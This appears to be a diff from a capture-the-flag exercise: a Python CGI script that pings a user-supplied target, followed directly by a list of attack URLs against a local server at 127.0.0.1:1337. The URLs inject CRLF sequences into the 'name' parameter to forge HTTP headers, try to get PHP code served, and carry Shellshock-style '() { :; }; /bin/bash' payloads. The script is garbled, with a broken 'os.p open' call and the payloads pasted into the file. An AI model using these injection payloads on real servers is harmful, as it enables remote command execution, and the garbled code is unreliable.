@@ -1,0 +1,30 @@
+#!/usr/bin/env python3
+
+import cgi
+import os
+from ipaddress import ip_address
+
+form = cgi.FieldStorage()
+name = form.getvalue('name')
+target = form.getvalue('target')
+
+if not name or not target:
+    print('Location: ../?error=Hey, you need to provide a name and a target!')
+try:
+    count = 1 # Increase this for an actual attack
+    os.p open(f'ping -c {count} {ip_address(target)}') 
+
+    print(f'Location: ../?result=Succesfully attacked {target}!')
+except:
+    print(f'Location: ../?error=Hey {name}, watch it!')
+    
+print('Content-Type: text/html')
+print()
+cgi-bin/attack-domain?target=;&name=Noob%0D%0ALocation:../cgi-bin/attack-ip/
+cgi-bin/attack-domain?target=;&name=Noob%0D%0ALocation:../cgi-bin/attack-ip/
+cgi-bin/attack-domain?target=;&name=Noob%0D%0AContent-Type: application/x-httpd-php%0D%0A%0D%0A<?php echo "1"; ?>
+cgi-bin/attack-domain?target=;&name=Noob%0D%0AContent-Type: application/x-httpd-php%0D%0A%0D%0A<%3C?php%20header(%22Location:%20../?error=Hey,%20you%20need%20to%20provide%20a%20target!%22);%20exit;%20?%3E
+
+http://127.0.0.1:1337/cgi-bin/attack-domain?target=;&name=Noob%0D%0ASet-Cookie:%20()%20{%20:;%20};%20/bin/bash%20-c%20%22sleep%205%22%0D%0ALocation:../cgi-bin/attack-domaincgi-bin/attack-domain?target=;&name=Noob%0D%0ASet-Cookie:%20()%20{%20:;%20};%20/bin/bash%20-c%20%22sleep%205%22%0D%0ALocation:../cgi-bin/attack-domain%0D%0A%0D%0A
+cgi-bin/attack-domain?target=;&name=Noob%0D%0ALocation: () { :; }; /bin/bash -c "sleep 5"
+
